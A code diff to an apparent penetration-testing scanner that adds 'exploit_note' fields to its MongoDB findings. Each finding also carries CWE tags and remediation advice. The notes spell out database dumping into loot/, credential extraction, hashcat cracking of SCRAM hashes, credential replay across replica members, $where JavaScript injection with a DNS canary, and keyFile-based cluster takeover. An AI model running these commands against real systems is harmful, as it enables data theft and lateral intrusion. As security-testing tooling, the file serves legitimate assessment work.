@@ -723,7 +723,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"{h.ip} --port {p.portid} --out loot/",
                     "Enable authentication (security.authorization: enabled), create "
                     "admin users, and bind the listener to a trusted interface only.",
-                    ["CWE-306", "CWE-284"], kind="mongo_unauth"))
+                    ["CWE-306", "CWE-284"], kind="mongo_unauth",
+                    exploit_note=(
+                        "mongodump --host <ip> --port <port> --out loot/ ; then "
+                        "hashcat -m 24200 loot/hashes -a 0 rockyou.txt and replay "
+                        "any cracked pair against other mongod ports discovered in "
+                        "scope."),
+                    depth_tier="t2"))
             elif pr.get("cred_access"):
                 dbs = pr.get("databases") or []
                 who = pr.get("cred_user", "?")
@@ -751,7 +757,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "?authSource=admin'",
                         "Rotate this credential IMMEDIATELY, enforce SCRAM-SHA-256, "
                         "and bind the listener to a trusted interface.",
-                        ["CWE-521", "CWE-798"], kind="mongo_weak_default"))
+                        ["CWE-521", "CWE-798"], kind="mongo_weak_default",
+                        exploit_note=(
+                            "mongosh 'mongodb://<user>:<pw>@<ip>:<port>/"
+                            "?authSource=admin' --eval 'db.adminCommand({usersInfo:1,"
+                            "showCredentials:true})' ; then mongodump with the same "
+                            "URI. Try the same (user,pw) on each replSet member and "
+                            "OS-layer services."),
+                        depth_tier="t3"))
                 else:
                     out.append(_finding(
                         "high", "MongoDB credentialed access (looted / weak credential)", tgt,
@@ -764,7 +777,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "--eval 'db.adminCommand({usersInfo:1,showCredentials:true})'",
                         "Rotate the credential; enforce least privilege / SCRAM-SHA-256; bind "
                         "to a trusted interface.",
-                        ["CWE-522", "CWE-284"], kind="mongo_cred_access"))
+                        ["CWE-522", "CWE-284"], kind="mongo_cred_access",
+                        exploit_note=(
+                            "mongodump --uri 'mongodb://<user>:<pw>@<ip>:<port>/"
+                            "?authSource=admin' --out loot/ ; feed harvested SCRAM "
+                            "hashes to hashcat -m 24100/24200."),
+                        depth_tier="t3"))
             # New probe outputs — surface regardless of the access path above.
             if pr.get("scripting_enabled"):
                 out.append(_finding(
@@ -780,7 +798,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Start mongod with --noscripting (or "
                     "security.javascriptEnabled: false) unless an application "
                     "requires server-side JS.",
-                    ["CWE-94", "CWE-95"], kind="mongo_scripting_enabled"))
+                    ["CWE-94", "CWE-95"], kind="mongo_scripting_enabled",
+                    exploit_note=(
+                        "mongosh 'mongodb://<ip>:<port>/test' --eval "
+                        "'db.foo.find({$where: \"sleep(150); return true\"})' - a "
+                        "measurable delay proves JS execution; then swap sleep() for "
+                        "a DNS(<canary>) primitive."),
+                    depth_tier="t1"))
             shards = pr.get("shard_hosts") or []
             if shards:
                 out.append(_finding(
@@ -886,7 +910,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Bind the `local` database to a trusted interface, enforce "
                     "authentication on every node, restrict `local` reads to "
                     "cluster-admin roles, and rotate the keyFile.",
-                    ["CWE-798", "CWE-522"], kind="mongo_cluster_keyfile"))
+                    ["CWE-798", "CWE-522"], kind="mongo_cluster_keyfile",
+                    exploit_note=(
+                        "python3 -c 'import hmac,base64,hashlib; ...' to derive the "
+                        "SCRAM saltedPassword from the HMAC key, then attempt "
+                        "SCRAM-SHA-256 as __system against each replset_member/"
+                        "shard_host - success = full cluster."),
+                    depth_tier="t3"))
             dm = pr.get("datamine")
             if dm and dm.get("secret_fields"):
                 sf = dm["secret_fields"]
@@ -914,7 +944,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "'db.getSiblingDB(\"<db>\").<collection>.find().limit(20)'   # full docs (ROE)",
                     "Encrypt sensitive fields; least-privilege the app role; remove "
                     "embedded credentials; bind to a trusted interface.",
-                    ["CWE-200", "CWE-312"], kind="mongo_datamine"))
+                    ["CWE-200", "CWE-312"], kind="mongo_datamine",
+                    exploit_note=(
+                        "grep -E 'mongodb://|postgres://|mysql://' "
+                        "loot/mongo/datamine.json - then feed each connstr to the "
+                        "matching recce db probe (probe_creds)."),
+                    depth_tier="t2"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "MongoDB end-of-life / legacy build", tgt,
@@ -1098,5 +1133,10 @@ def _probe_members(discovered: list, targets: list, creds, max_members: int = 8)
             "'db.adminCommand({listDatabases:1})'   # then run `recce enum` on this host",
             "Secure every replica-set member identically; bind to a trusted interface; "
             "require SCRAM auth.",
-            ["CWE-306", "CWE-284"], kind="mongo_replica_member"))
+            ["CWE-306", "CWE-284"], kind="mongo_replica_member",
+            exploit_note=(
+                "mongodump --host <lateral-host> --port <port> --out "
+                "loot/mongo/<host>/ ; feed hashes and connstrs into the shared pools "
+                "like the primary path already does."),
+            depth_tier="t2"))
     return out
